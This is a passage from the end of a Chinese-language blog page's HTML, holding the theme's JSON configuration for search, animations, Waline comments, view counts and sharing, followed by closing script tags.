天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"/js/3rd"}},"version":"4.8.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1752320385" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1752320385" defer></script></body></html>
